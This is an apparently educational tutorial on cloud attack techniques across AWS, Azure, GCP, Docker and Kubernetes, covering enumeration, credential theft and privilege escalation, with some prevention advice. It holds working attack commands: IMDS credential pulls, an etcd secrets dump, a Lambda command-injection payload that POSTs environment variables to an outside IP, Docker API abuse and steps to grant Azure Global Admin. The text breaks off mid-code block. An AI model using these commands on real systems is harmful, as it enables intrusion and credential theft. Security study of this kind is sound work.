✦What is Cloud Hacking?
Many companies today store their important data and run their business applications on the cloud (like Google Cloud, AWS, or Microsoft Azure) because it’s cheaper, more flexible, and easily accessible. However, this also comes with security risks. Cloud hacking means when attackers break into cloud systems by finding weak points (called vulnerabilities) in the technology or security settings. Once inside, they can steal data, block access, or even take full control of services.
Since a lot of sensitive data — like personal info, business secrets, and financial records — is now stored in the cloud, hacking it can cause huge damage to both individuals and companies. People may lose trust in cloud services if their data is not safe.
Why Do Attackers Hack the Cloud?
Attackers can benefit in several ways:
1. Stealing Important Data
If a company doesn’t use strong security, hackers can steal private or sensitive information, such as passwords, credit card details, or business documents. This is called data exfiltration.
2. Accessing Apps Without Permission
Attackers can break into cloud-based apps (like email, CRM, storage tools) without having proper authorization. This helps them spy, steal, or change data.
3. Stealing Login Credentials
Sometimes, attackers trick legitimate users or take advantage of weak security to get their usernames and passwords, and then use these to log in as someone else.
4. Illegal Crypto Mining
Hackers can secretly use a company’s cloud systems (which have strong computers) to mine cryptocurrency (like Bitcoin). This is like stealing someone else’s electricity and computers to make money.
5. Spreading Crypto-Mining Malware
They may also install hidden malware (malicious software) that keeps generating cryptocurrency without anyone knowing. This drains system resources and slows everything down.
6. Denial-of-Service (DoS) Attacks
Hackers can flood a cloud system with so many fake requests that real users can’t access it anymore. This can bring down websites or apps, causing losses and frustration.
7. Changing Cloud Settings
Some attackers exploit weak points in how tokens or synchronization systems work. Tokens are like digital keys that grant access. By misusing them, attackers can change important settings in cloud services.
8. Lateral Movement & Network Control
Once inside the cloud, hackers may move from one part of the network to another, looking for more data or systems to control. They may also manipulate network traffic to spy or redirect information.
Why It Matters :-
 Cloud hacking isn’t just about stealing data. It can lead to business downtime, lost trust, legal issues, and huge financial damage.
 Companies must build strong security to protect cloud resources — like using strong passwords, multi-factor authentication, encryption, and continuous monitoring.
 Understanding how attackers work helps in preventing these attacks.

✦Container Vulnerability Scanning Using Trivy
What Are Containers?
Containers are lightweight, standalone packages that include everything an application needs to run:
 Operating System (OS)
 Application code
 Runtime (like Python, Node.js)
 Libraries and dependencies
Because they are reused across environments, developers often pull container images (like from DockerHub), which might include open-source packages with known security vulnerabilities.
If attackers find these vulnerabilities, they can:
 Gain unauthorized access
 Take control of the container engine
 Affect the entire cloud infrastructure
What Is Trivy?
Trivy is a free and automated tool used to scan container images for vulnerabilities.
Features:
 Just provide the image name, and Trivy will start scanning.
 Detects:
  OS-level vulnerabilities in systems like:
     Alpine Linux
     Red Hat Enterprise Linux (RHEL)
     CentOS
  Application-level vulnerabilities in dependencies from:
    Bundler (Ruby)
    Composer (PHP)
    npm, yarn (JavaScript)
 Source:
    [Trivy GitHub Repository](https://github.com)

✦Kubernetes Vulnerability Scanning Using Sysdig
What Is Kubernetes?
Kubernetes is a platform used to orchestrate and manage containers. It handles scaling, deploying, and running apps in containers. But it’s also complex, and misconfigurations often create security holes.
These misconfigurations can be exploited by attackers to:
 Break into clusters
 Escalate privileges
 Access confidential data
What Is Sysdig?
Sysdig is a security tool used to scan Kubernetes clusters for vulnerabilities.
 Features:
  Integrates with DevOps pipelines (CI/CD) to secure the software from the start.
  Connects with:
   Image registries (like DockerHub, ECR)
   Kubernetes Admission Controllers (used to approve or reject deployments)
  Scans images before they run in Kubernetes
  Creates a detailed inventory of everything inside your containers
  Continuously checks for new CVEs (Common Vulnerabilities and Exposures)
 Source:
    [Sysdig Official Website](https://sysdig.com)
Other Kubernetes Vulnerability Scanning Tools
Besides Sysdig, here are some other tools used to scan and detect Kubernetes security issues:
| Tool        | Description                                              | Source                                                |
| ------------| -------------------------------------------------------- | ----------------------------------------------------- |
| Pipeline    | Used to integrate security into CI/CD processes          | [Pipeline by BanzaiCloud](https://banzaicloud.com)    |
| kube-hunter | Finds security issues in live Kubernetes clusters        | [GitHub](https://github.com/aquasecurity/kube-hunter) |
| Kube-Scan   | Provides risk scoring for Kubernetes workloads           | [GitHub](https://github.com/octarinesec/kube-scan)    |
| Kubesec     | Scans Kubernetes resource definitions (like YAML files)  | [Kubesec](https://kubesec.io)                         |
| KubiScan    | Identifies risky RBAC permissions in Kubernetes clusters | [GitHub](https://github.com/cyberark/KubiScan)        |

✦What is Amazon S3?
Amazon S3 (Simple Storage Service) is a cloud-based storage service provided by AWS (Amazon Web Services). It allows users to:
 Store files like PDFs, images, videos, and documents
 Access them using the internet via APIs or web links
 Organize the data in something called a "bucket" — like folders that must have unique names
 Why S3 Buckets Are Targeted?
  Sometimes, people make mistakes in the security settings (called misconfigurations) while creating or managing S3 buckets. This can make the bucket:
   Publicly accessible without permission
   Vulnerable to data theft
   Exploitable— attackers may inject malware or malicious scripts if the session remains open
   Attackers try to find out the bucket name and URL, then test its settings to see if they can break in or exploit the content.
 Techniques Attackers Use to Enumerate (Find and Test) S3 Buckets:
 1]Inspecting HTML Source Code
 When attackers view the HTML source code of a website, they may find links pointing to an S3 bucket.
 These links might look like:
  `https://s3.amazonaws.com/my-bucket-name/file.png`
 If the bucket name is exposed, attackers test it for misconfigurations.
 2]Brute-Forcing the Bucket URL
 S3 bucket URLs follow a pattern like:
  `http://s3.amazonaws.com/[bucket_name]`
 If attackers don’t know the exact name, they use brute-force tools to try many names until they find a valid one.
 Tool Example: Burp Suite (Burp Intruder)
 3]Finding Subdomains
 Sometimes, buckets are linked to subdomains like:
  `mybucket.mycompany.com`
 Attackers use tools to discover these subdomains, which may reveal bucket names.
 Tools:OWASP, AmassRobtex
 4]Reverse IP Search
 Attackers use search engines like Bing to find domains that are hosted on the same IP address.
 They use special search commands like:
  `ip:<target IP address>`
 This might reveal other S3 bucket-related domains linked to the same company.
 5]Advanced Google Hacking (Google Dorking)
 Google Dorking is using smart search queries to find hidden or forgotten files on the internet.
 Attackers use the `inurl:` operator in Google to find S3 URLs.
 Common search examples:
   `inurl:s3.amazonaws.com`
   `inurl:s3.amazonaws.com/audio/`
   `inurl:s3.amazonaws.com/video/`
   `inurl:s3.amazonaws.com/backup/`
   `inurl:s3.amazonaws.com/movie/`
   `inurl:s3.amazonaws.com/image/`
 These dorks can expose sensitive or personal files unintentionally left open.
What Happens If Attackers Succeed?
 6]Identifying Open S3 Buckets using S3Scanner 
 What is S3Scanner? :- S3Scanner is a tool that hackers use to search for and access open (publicly exposed) S3 buckets.
  With S3Scanner, attackers can:
  See what's stored in the buckets (files, folders, etc.)
  Check who has permission to read or write
  Even download the contents if the bucket allows it
 Example Commands Using S3Scanner
 1)Scan multiple S3 buckets using a list and 8 threads:
   s3scanner --threads 8 scan --buckets-file ./bucket-names.txt
   This checks many buckets at once from a list (`bucket-names.txt`) using 8 parallel processes (to make it faster).
 2)Download contents of a specific bucket:
   s3scanner dump --bucket my-bucket-to-dump
   This will try to download all files from the bucket named `my-bucket-to-dump`.
 7]Enumerating AWS Account IDs
 What is an AWS account ID? :- It’s a unique number (like an ID card) given to every AWS account. This ID should stay private.
 But sometimes these IDs leak by accident, such as:
  In error messages from AWS
  On code-sharing sites like GitHub
  In screenshots shared online
  In public database backups (RDS snapshots)
  In public storage disks (EBS snapshots)
  In public machine images (AMIs)
  When people post them online while asking for tech support
 Once attackers get this ID, they may:
  Look for more resources linked to that AWS account (like users, roles, storage)
  Try to assume roles in that account (to gain access)
  Try to run functions (like AWS Lambda) that belong to the account
 8]IAM Role Enumeration (Finding AWS IAM Roles)
 What are IAM Roles? :- IAM roles in AWS are like temporary access passes that allow someone (a user or service) to perform certain tasks, like accessing a file or running a program.
 What do attackers do?
  Attackers try to guess IAM role names by sending role-assumption requests to AWS. Based on the error messages AWS sends back, they can figure out:
   Whether a role exists or not
   Even if they can’t access the role, they know it’s there
   For example:
    If a role exists but the attacker doesn’t have permission, AWS shows a specific error.
    If a role doesn’t exist, AWS shows a different error.
   This difference helps attackers confirm valid roles.
 What information do attackers gather?
  Names of internal tools or services (like “devops-stack”)
  IAM usernames (which can be used in social engineering attacks)
  AWS services that the company is using
  3rd-party tools being used (e.g., Datadog, Okta, CloudSploit)
 Why is this dangerous?
  Once they find open or weak IAM roles, attackers can steal credentials and gain unauthorized access to cloud resources.
 9]S3 Bucket Permission Enumeration Using S3Inspector
 What is S3Inspector? :- S3Inspector is a tool attackers use to **check whether S3 buckets are public or private.**
 What does it do?
 If a bucket is public, S3Inspector shows:
   Who can access it
   URLs of files stored inside
 If the bucket is not public, the tool will return access denied
 Why is this dangerous?
 Public S3 buckets can expose:
  Private data
  Images, videos, text files
  Credentials or backups
  Attackers use this information for data theft or blackmail.
 10]Enumerating Kubernetes etcd Database
 What is etcd?
  In Kubernetes, `etcd` is a key-value database used to store all cluster-related information: Configuration data, Secrets (like passwords), Service details, Access info
  It's basically the heart of a Kubernetes cluster.
 What do attackers do?
  They try to locate and access the etcd server by:
   Checking for etcd processes and config files
   Scanning open ports (like port 2379, which etcd uses)
  Running commands like:
  ps -ef | grep apiserver
  Once they find etcd, they can try to access sensitive info using commands like:
   bash
   ETCDCTL_API=3 ./etcdctl --cacert=... --cert=... --key=... --endpoints=https://127.0.0.1:2379 get /registry/ --prefix | grep '/registry/secrets/'
 What do attackers get?
  Certificates and private keys
  Secrets stored in the cluster
  Tokens used to access services
  YAML files with configuration Why is this dangerous?
 If attackers access etcd:
  It’s like getting admin/root access to the entire Kubernetes cluster
  They can escalate privileges, move to other nodes, and even take over the system
 11]Enumerating Azure AD Accounts
 What is Azure AD? :- Azure Active Directory (AD) is Microsoft’s cloud-based identity service. It is used by many organizations to manage user accounts, logins, emails (Office 365), and access to other services. Because services like Office 365 are accessible from the internet, attackers can target them easily.
 1)Account Enumeration
 What is it? :- Account enumeration is when attackers try to find out which user accounts exist in an Azure AD system.
 Tool Used: Azucar
  Source: [Azucar GitHub](https://github.com)
  Azucar is a security tool that helps users (or attackers) scan Azure environments.
  It is multi-threaded (fast) and can:
   Check for user accounts
   Identify admin groups
   Assess security misconfigurations
 It’s a read-only tool — it gathers info but doesn’t harm the environment directly.
 Why is this dangerous?
  Identify real users and admins
  Plan further attacks like phishing or brute-force attacks using known usernames
 2)Password Spraying
 What is Password Spraying? :- Instead of trying many passwords on one account (which would trigger lockouts), attackers try one common password on many accounts.
 This helps them:
  Avoid account lockouts
  Increase chances of breaking into an account that uses a weak or common password
 Tool Used: Ruler
  Source: [Ruler GitHub](https://github.com)
  Ruler is a tool that lets attackers interact with Exchange servers (like those used in Office 365).
 It can use protocols like:
   RPC/HTTP
   Messaging Application Programming Interface (MAPI)
 12]Gathering Cloud Keys Through IMDS Attack
 What are Cloud Keys? :- Cloud keys in AWS are like username + password for accessing cloud services.
 They include: Access Key ID, Secret Access Key
 These keys are used to allow apps or users to connect to services like S3, EC2, etc.
 What is IMDS? :- IMDS (Instance Metadata Service) lets AWS EC2 instances talk to AWS and get information like: Instance ID, IAM Role name, Temporary credentials (cloud keys)
 IMDS runs on a special internal IP address: `169.254.169.254`
 How do attackers exploit IMDS (IMDSv1)? :- If attackers somehow get inside an EC2 instance (e.g., via a web app or SSRF attack), they can send requests to IMDS and steal cloud credentials.
 Steps:
 1)Run this to list roles attached to the EC2:
   curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
 2)Then, run this with the role name to get the cloud keys:
   curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM-Role-Name>
 IMDSv2: A More Secure Version :- IMDSv2 uses a token-based approach to protect access.
 Steps (if using IMDSv2):
 1)First, get a token:
   TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
 2)Then use that token in future metadata requests:
   curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
 13]Exploiting AWS with Nimbostratus
 What is Nimbostratus? :- Nimbostratus is a tool that attackers use to:
 Find out what an AWS user or role can do
 Steal cloud credentials
 Make new users
 Access databases via snapshots
 Key Features of Nimbostratus:
|  Action             |  What it Does                                                              |
| ------------------- | -------------------------------------------------------------------------- |
| `dump-credentials`  | Shows all credentials stored in the system (from metadata, env vars, etc.) |
| `dump-permissions`  | Lists all actions the stolen credentials can perform                       |
| `dump-ec2-metadata` | Reveals instance metadata (info about EC2 and attached roles)              |
| `snapshot-rds`      | Creates a database snapshot and restores it to access stored data          |
| `create-iam-user`   | Makes a **new user account** using the stolen credentials                  |
 How to Prevent These Attacks
  Use IAM roles only — never give root access to users or apps
  Give least privilege — only allow what is absolutely needed
  Use instance profiles — this helps manage permissions cleanly
  Group users — assign fine-grained policies to groups instead of individual users
  Audit permissions regularly — check who has access to what and remove anything unnecessary
 14]Exploiting Misconfigured AWS S3 Buckets
 Step 1: Find the S3 Buckets
  Attackers use special tools to search for exposed S3 buckets.
  Some of the popular tools are: S3Scanner, lazys3, Bucket Finder, s3-buckets-bruteforcer
 These tools help find bucket URLs, such as:
  http://[bucket_name].s3.amazonaws.com/
 Step 2: Install AWS CLI
  To interact with S3, attackers set up the AWS Command Line Interface (CLI): aws --version
  They create a dummy account (sometimes even a real one) to use the CLI.
 Step 3: Get Access Keys
  From the AWS Management Console:
  1)Go to [IAM Console](https://console.aws.amazon.com/iam/)
  2)Click Users → Add User
  3)Enter details and click Create User
  4)Download the CSV file to get the Access Key ID and Secret Access Key
 Step 4: Configure AWS CLI
  Run this command in terminal: aws configure
  You'll be asked to enter: Access Key ID, Secret Access Key, Default region, Output format (e.g., json)
 Step 5: Check If Buckets Are Vulnerable
 To check access (even without credentials), run:
  aws s3 ls s3://[bucket_name] --no-sign-request
  If files are listed, the bucket is publicly readable.
  If access is denied, it may still be misconfigured in other ways.
 Step 6: Exploit the S3 Bucket
 Attackers can now manipulate the data inside the S3 bucket using these commands:
| Action       | Command                                                                 |
| -------------| ----------------------------------------------------------------------- |
| Read Files   | `aws s3 ls s3://[bucket_name] --no-sign-request`                        |
| Move Files   | `aws s3 mv FileName s3://[bucket_name]/test-file.txt --no-sign-request` |
| Copy Files   | `aws s3 cp FileName s3://[bucket_name]/test-file.svg --no-sign-request` |
| Delete Files | `aws s3 rm s3://[bucket_name]/test-file.svg --no-sign-request`          |
 Best Practices to Prevent This
|  Do This                          |  Avoid This                                     |
| --------------------------------- | ----------------------------------------------- |
| Enable bucket encryption          | Leaving buckets public unintentionally          |
| Use proper IAM policies           | Using `*` (wildcard) permissions                |
| Block public access unless needed | Uploading sensitive data without access control |
| Monitor bucket access logs        | Ignoring security audits or warnings            |
 15]Compromising AWS IAM Credentials
 AWS IAM (Identity and Access Management) is used to control who can access AWS services and resources. However, attackers can compromise IAM credentials by exploiting various weaknesses in how cloud environments are managed.
 1)Repository Misconfigurations
 Developers sometimes store AWS keys in shared Git repositories for convenience.
 If keys are accidentally made public (e.g., via GitHub), attackers can find and misuse them.
 Even with AWS alerts, attackers may still exploit these leaks before action is taken.
 Example: An environment variable file pushed to GitHub with a commit message like "updated .gitignore" can accidentally reveal AWS API keys.
 2)Social Engineering
 Attackers trick users through fake emails, calls, or SMS.
 They might create phishing pages to capture AWS API keys directly from users.
 3)Password Reuse
 Users often reuse passwords across multiple platforms.
 If an attacker gets one password from a data breach, they can try the same credentials on AWS.
 Passwords may be stolen if another service’s database is compromised.
 4)Vulnerabilities in AWS-Hosted Applications
 a]Server-Side Request Forgery (SSRF)
 Attackers exploit web app flaws to send internal requests.
 They target the EC2 metadata service to obtain temporary credentials via IAM instance profiles.
 b]Reading Local Files
 AWS credentials stored locally (e.g., in `.aws/credentials` or environment variable files) can be read if the attacker gains OS-level access.
 5)Exploiting Third-Party Software
 Organizations use third-party tools to manage cloud services.
 If these tools are compromised (e.g., a password manager), attackers can access AWS credentials and resources.
 6)Insider Threats
 Insiders, like current or former employees, can misuse their access.
 A disgruntled employee may leak data, make unauthorized changes, or sabotage the system without needing to steal credentials.
 16]Enumerating Azure AD Accounts & Exploiting Cloud IAM Roles
 1)Azure Active Directory (AD) Enumeration
  Attackers target cloud-based services like Office 365, which are directly accessible from the Internet, to enumerate user and admin accounts in Azure AD.
 Account Enumeration
  Tool: [Azucar](https://github.com/nccgroup/azucar)
  Purpose: Audits security posture of Azure environments.
  Functionality: Multi-threaded, plug-in based, non-intrusive assessment.
 2)Password Spraying
  Method: Attempts the same password across many accounts to avoid lockouts.
  Risk: If on-prem and cloud accounts share credentials and lack MFA, attackers can gain access.
  Tool: [Ruler](https://github.com/sensepost/ruler)
  Use: Interacts with Exchange servers using protocols like RPC/HTTP.
 17]Hijacking AWS IAM Roles using Pacu
 Misconfigured IAM policies (e.g., `“AWS”:“*”`) can allow unauthorized users to assume roles and extract credentials.
 Tool: [Pacu](https://github.com/RhinoSecurityLabs/pacu)
 Purpose: AWS exploitation framework.
 Features:
   Enumerates IAM roles using built-in wordlists.
   Automatically assumes misconfigured roles.
   Exposes role credentials in JSON format.
 Command Example:
  assume_role_enum.py [-h] [-p PROFILE] [-w WORD_LIST] -I ACCOUNT_ID
 18]Cracking AWS Access Keys with DumpsterDiver
 Attackers search for hardcoded secrets and passwords within files on local systems or repositories.
 Tool: [DumpsterDiver](https://github.com/securing/DumpsterDiver)
 Purpose: Scans files for AWS keys, SSL certificates, Azure keys, etc.
 Notable Flags:
  `-p LOCAL_PATH`: Directory to scan.
  `-s`: Search for hardcoded passwords.
  `-a`: Use advanced custom rules (`rules.yaml`).
  `-o OUTFILE`: Output results in JSON.
 Command Example:
  DumpsterDiver.py -p /target/folder -s -a -o output.json
 19]Exploiting Docker Containers on AWS using CCAT
 Cloud Container Attack Tool (CCAT) is used by attackers to exploit Docker containers hosted on AWS — particularly through ECS (Elastic Container Service) and ECR (Elastic Container Registry).
 Overview :- Attackers start with stolen or misused AWS credentials and use CCAT to:
 1)Find Docker images in ECR
 2)Pull and modify those images (add backdoors)
 3)Push them back to AWS to hijack future container runs
 Step-by-Step Attack Process
 Step 1: Abuse AWS Credentials
  What attackers do: Use stolen credentials to explore AWS services.
  Tool Module Used: `Enumerate ECR`
  Goal: List available ECR repositories (locations where Docker images are stored).
 Step 2: Pull Target Docker Image
  What attackers do: Identify a Docker image from the list and pull it.
  Tool Module Used: `Pull Repos from ECR`
  Goal: Download the Docker image of the target organization for tampering.
 Step 3: Create a Backdoor Image
  What attackers do: Inject a reverse shell or other backdoor into the Docker image.
  This is done by replacing the default `CMD` in the Dockerfile to initiate a reverse shell.
  Tool Module Used: `Docker Backdoor`
 Step 4: Push the Backdoored Image Back
  What attackers do: Push the modified (backdoored) Docker image back to the ECR repository.
  Tool Module Used: `Push Repos to ECR`
  Goal: Replace the original image so that when it’s used, the backdoor gets triggered.
 Attack Impact
  When AWS services (like ECS) launch a container using the infected image, the attacker gets remote access to the container.
  This can lead to: Data theft, Lateral movement within the AWS environment, Full infrastructure compromise
 20]Serverless-Based Attacks on AWS Lambda
 AWS Lambda functions, while eliminating the need to manage servers, introduce new security risks. These serverless functions are vulnerable to application-level attacks such as: DDoS (Distributed Denial of Service), Command Injection, Cross-Site Scripting (XSS)
 Attackers can abuse Lambda functions to gain unauthorized access and elevate privileges within a cloud environment. Two main attack models are used:
 1)Black-Box Scenario :- Attacker has no prior knowledge of the environment and works by making assumptions and exploiting misconfigurations.
 Steps:
 1}Access Misconfigured S3 Bucket
 No credential restrictions allow access to organizational files.
 2}Upload Malicious Files to S3
 Attacker rechecks permissions after upload.
 3}Invoke Lambda for Tag Calculation
 Lambda functions triggered to calculate file tags may leak metadata.
 4}Exfiltrate Cloud Credentials
 Use environment variables or misconfigured code to steal credentials and escalate privileges.
 AWS CLI Commands Used:
 List S3 bucket contents:
  aws s3 ls prod-file-bucket-eu
 Get file tags:
  aws s3api get-object-tagging --bucket prod-file-bucket-eu --key config161.zip
 Inject commands (command injection):
  aws s3 cp config.zip 's3://prod-file-bucket-eu/screen;curl -X POST -d "testCurl" <Target IP>:443;'
 Extract AWS credentials via environment dump:
  aws s3 cp config.zip 's3://prod-file-bucket-eu/screen;curl -X POST -d "`env`" <Target IP>:443;.zip'
 2)White-Box Scenario :- Attacker has internal knowledge, such as credentials and account configuration details.
 Steps:
 1}Phishing or Social Engineering
   Attacker acquires valid user credentials.
 2}Enumerate IAM Roles and Policies
   Identifies S3 buckets or other misconfigured resources.
 3}List Lambda Functions
   Gathers metadata about Lambda functions.
 4}Download Lambda Code
   Looks for vulnerable code or hardcoded secrets.
 5}Exploit Lambda Function
   Use the exploited Lambda to perform lateral movement or data exfiltration.
 AWS CLI Commands Used:
 List user policies:
  aws iam list-attached-user-policies --user-name operator
 List Lambda functions:
  aws lambda list-functions
 Download Lambda code:
  aws lambda get-function --function-name corpFuncEasy
 21]Exploiting Shadow Admins in AWS
 Shadow Admins are user accounts with unusual or indirect admin-level privileges. Attackers often exploit these accounts after gaining initial access to escalate privileges and take control of the cloud environment.
 Common Exploitation Techniques:
 1)Elevating Access Permissions
   Permission Abused: `Microsoft.Authorization/elevateAccess/Action`
   Allows attackers to promote their access level to global administrator.
2)Modifying Existing Roles
   Permission Abused: `Microsoft.Authorization/roleDefinitions/write`
   Enables attackers to edit roles and grant themselves admin access.
3)Creating New Admin Accounts
   Permission Abused: `Microsoft.Authorization/roleAssignments/write`
   Attackers assign privileged roles to new or existing accounts.
   Abusing custom roles like Storage Team Leader can also grant full control.
 Shadow Admin Scanning Tools
 | Tool Name  | Description                                                                |
 | ---------- | -------------------------------------------------------------------------- |
 | SkyArk     | Scans AWS & Azure for risky accounts. Modules: `AWStealth`, `AzureStealth` |
 | Red-Shadow | Detects over-privileged IAM roles in cloud environments                    |
 | ACLight2   | Scans Azure AD permissions and identifies shadow admins                    |
 22]Exploiting Docker Remote API
 The Docker Remote API can be abused if exposed publicly or protected weakly, allowing attackers to interact with containers and the host system.
 Common Attack Techniques:
 1)Retrieving Files from Docker Host
 docker -H <Remote IP:Port> pull alpine
 docker -H <Remote IP:Port> run -t -d alpine
 docker -H <Remote IP:Port> exec <container_name> ls
  Mounts volumes to access host directories.
  Useful to extract sensitive configs or source code.
 2)Accessing External Mounts
 docker inspect <container_name>
  Reveals external storage mounts like S3, NFS.
  Writable mounts can be manipulated or overwritten.
 3)Internal Network Scanning
 docker -H <docker host> run --network=host --rm marsmensch/nmap -ox <IP Range>
  Uses `nmap` from inside container to **scan the host’s LAN**.
  Reveals reachable internal services.
 4)Retrieving Credentials
 docker inspect <container_name>
 docker exec -i <container_name> env
  Reads environment variables (common place for passwords, tokens).
 5)Querying Databases
 docker -H [docker host] ps | grep mysql
 docker -H [docker host] exec -i some-mysql env
 docker -H [docker host] exec -i some-mysql mysql -u root -p<password> -e "show databases"
  Identifies MySQL containers.
  Uses leaked creds to extract data.
 23]Hacking Container Volumes in Kubernetes
 Kubernetes containers share volumes to manage filesystems. These volumes are like shared directories accessible to all containers in a pod. Kubernetes supports volume types like NFS and iSCSI.
 Key Exploitable Volume Weaknesses:
  Weak/default configurations can lead to privilege escalation and lateral movement.
 Common Attack Vectors:
 1)Accessing Master Nodes:
   Volumes like iSCSI store configs as Kubernetes Secrets.
   If attackers access the API server or etcd, they can extract these secrets.
 2)Accessing Nodes:
   Kubelet, which manages pods, allows attackers (with node access) to read all volumes used in the pod.
   Using tools like `df`, attackers can identify mounted volumes and their sources (e.g., NFS).
 3)Accessing Containers:
   From inside a container, attackers can:
    Mount hostPath volumes to access node-level files.
    Use filesystem tools to explore all mounted directories.
 24]CloudGoat 2 – AWS Exploitation Training Tool
 CloudGoat 2 by Rhino Security Labs simulates vulnerable AWS environments for capture-the-flag (CTF) exercises.
 Included Scenarios:
  rce\_web\_app – Remote code execution (RCE) in a web app inside a VPC.
  iam\_privesc\_by\_attachment – Attach instance profiles to escalate privileges.
  iam\_privesc\_by\_rollback – Revert to previous IAM policy versions to gain elevated access.
  codebuild\_secrets – Extract secrets from CodeBuild and SSM.
  ec2\_ssrf – Exploit SSRF to extract AWS keys from EC2 metadata.
 25]Gaining Access via SSRF in AWS
 Exploiting SSRF to Retrieve Credentials:
  Vulnerable web applications allow SSRF attacks (e.g., via GET parameter `url`).
  Attackers query [http://169.254.169.254/latest/meta-data/](http://169.254.169.254/latest/meta-data/) to extract IAM role credentials.
 Using Stolen AWS Credentials:
 1)Configure local AWS CLI: aws configure --profile stolen_profile
 2)Verify access: aws sts get-caller-identity --profile stolen_profile
 3)List S3 buckets: aws s3 ls --profile stolen_profile
 4)Download bucket content: aws s3 sync s3://bucket-name /home/attacker/localstash/targetcloud/ --profile stolen_profile
 26]AWS IAM Privilege Escalation Techniques (by Rhino Security Labs)
 Once attackers gain initial access to an AWS environment, they attempt to escalate privileges using various IAM (Identity and Access Management) tricks. Below are some common techniques:
 1)Create a New Policy Version
  Required Permission: `iam:CreatePolicyVersion`
  What happens: Attacker creates a new version of an existing IAM policy with admin-level permissions and   sets it as default.
  Why it's dangerous: Even without `iam:SetDefaultPolicyVersion`, using `--set-as-default` flag while creating   lets them activate the malicious version immediately.
 2)Switch to an Older Policy Version
  Required Permission: `iam:SetDefaultPolicyVersion`
  What happens: If a policy has older versions with more privileges, attacker switches back to one of them.
  Result: Instant privilege gain without creating anything new.
 3)Create EC2 Instance with Privileged Role
  Required Permissions: `iam:PassRole`, `ec2:RunInstances`
  What happens: Attacker spins up a new EC2 instance and attaches an existing IAM role (with high permissions).
  Abuse: Use EC2 metadata service to get temporary credentials.
 4)Create New Access Key
  Required Permission: `iam:CreateAccessKey`
  What happens: Attacker generates new programmatic keys for an IAM user.
  Result: Full access to APIs with the victim’s privileges.
 5)Create or Update Console Login Profile
  Required Permissions: `iam:CreateLoginProfile`, `iam:UpdateLoginProfile`
  What happens:
   `CreateLoginProfile`: Attacker sets up a new password for console access.
   `UpdateLoginProfile`: Attacker changes existing user’s password.
  Danger: Enables access to AWS Management Console with elevated privileges.
 6)Attach Policy to User, Group, or Role
 Required Permissions:
  `iam:AttachUserPolicy`
  `iam:AttachGroupPolicy`
  `iam:AttachRolePolicy`
  What happens: Attacker attaches high-privilege policies to users, groups, or roles to elevate their access.
 7)Create/Update Inline Policy
 Required Permissions:
   `iam:PutUserPolicy`
   `iam:PutGroupPolicy`
   `iam:PutRolePolicy`
  What happens: Attacker injects inline policies directly into identities (users, groups, roles).
  Impact: Often used to grant full `AdministratorAccess`.
 8)Add User to High-Privilege Group
Required Permission: `iam:AddUserToGroup`
What happens: Attacker adds themselves or a compromised user to a group with elevated access (e.g., `Admins`).
Effect: Instantly inherits group permissions.
 27]Escalating Privileges of Google Storage Buckets using GCPBucketBrute
 Google Cloud Storage (GCS) uses buckets to store data—similar to Amazon S3. If these buckets are misconfigured, they can become vulnerable to privilege escalation attacks. This typically occurs when IAM policies or Access Control Lists (ACLs) are too permissive.
 Tool Used: GCPBucketBrute
 GCPBucketBrute is a security tool designed to:
  Enumerate Google Cloud buckets.
  Test permissions on each bucket.
  Identify if privilege escalation is possible.
 Common Misconfiguration:
  Buckets that allow `allUsers` (public) or `allAuthenticatedUsers` (any GCP user) to view IAM policies.
  This exposes permission data that attackers can leverage.
 How GCPBucketBrute Works:
 1)Bucket Policy Enumeration
   The tool makes a request to:
   `https://www.googleapis.com/storage/v1/b/BUCKETNAME/iam`
    If accessible, it means the bucket's IAM policy is public.
    If denied, permissions are restricted (as expected).
 2)Testing Bucket Permissions
   It uses the `TestIamPermissions` API by providing:
    Bucket name
    List of GCS permissions (like `storage.objects.list`, `storage.buckets.update`, etc.)
   If the request returns specific allowed permissions, the attacker knows what they can do.
 3)Privilege Escalation Check
   GCPBucketBrute analyzes whether the permissions are sufficient to:
    Modify bucket IAM policies,
    Upload or delete sensitive files,
    Add new roles or escalate to admin-level control.
    If so, it flags the bucket as vulnerable to privilege escalation.
 Real-World Impact
  If attackers find a vulnerable bucket and escalate privileges:
   They can grant themselves admin access.
   View, modify, or delete all data in the bucket.
   Possibly pivot to other services using the elevated identity.
 28]Privilege Escalation in Google Cloud (GCP) via GCPBucketBrute
  Misconfigured Google Cloud Storage (GCS) buckets can expose permissions publicly or to all GCP users. This opens the door for privilege escalation using tools like GCPBucketBrute.
 Tool: [GCPBucketBrute](https://rhinosecuritylabs.com)
 Steps:
  Enumerate Buckets: Uses GCPBucketBrute to scan and identify accessible GCS buckets.
  Check IAM Policy:
    Sends request to: `https://www.googleapis.com/storage/v1/b/BUCKETNAME/iam`
    If `allUsers` or `allAuthenticatedUsers` can read the policy, it returns data.
  Test Permissions:
    Uses TestIamPermissions API to enumerate allowed permissions for the user on the bucket.
  Privilege Escalation Detection:
    If a user has sufficient permissions (like `storage.buckets.setIamPolicy`), the tool flags the bucket as vulnerable to escalation.
    Attacker may escalate their role to admin by modifying bucket IAM policies.
 29]Privilege Escalation in Microsoft Azure AD via Misconfigured Accounts
 Misconfigured Azure AD user accounts can be escalated to Global Administrator using PowerShell and self-signed certificates.
 Tools: AzureAD PowerShell Module, BloodHound / AzureHound
 Steps:
  Identify Normal User: Tools like **BloodHound/AzureHound** used to map out users and permissions.
  Log into Azure AD:
  Create Self-Signed Certificate:
     ```powershell
     $pwd = <password>
     $path = <thumbprint>
     Export-PfxCertificate -cert $path -FilePath <save_path.pfx> -Password $pwd
     ```
  Upload Certificate to Azure AD App.
  Use Certificate to Authenticate:
     ```powershell
     Connect-AzureAD -TenantId <tenant_id> -ApplicationId <app_id> -CertificateThumbPrint <thumbprint>
     ```
  Assign Global Admin Role:
     ```powershell
     Add-AzureADDirectoryRoleMember -RefObjectId <normaluser_object ID> -ObjectId <Globaladmin_ID>
     ```
  Verify: Check Azure AD portal for escalated role.
 30]Creating Backdoor Accounts in AWS via Endgame and Pacu
 An attacker with valid AWS API access can **create backdoor accounts by manipulating IAM policies or Resource Access Manager (RAM) settings.
 Tools: [Endgame](https://github.com), [Pacu](https://github.com/RhinoSecurityLabs/pacu)
 Steps:
  Access IAM with Valid Credentials.
  List Resources:
   ```bash
   endgame list-resources -s iam      # IAM only
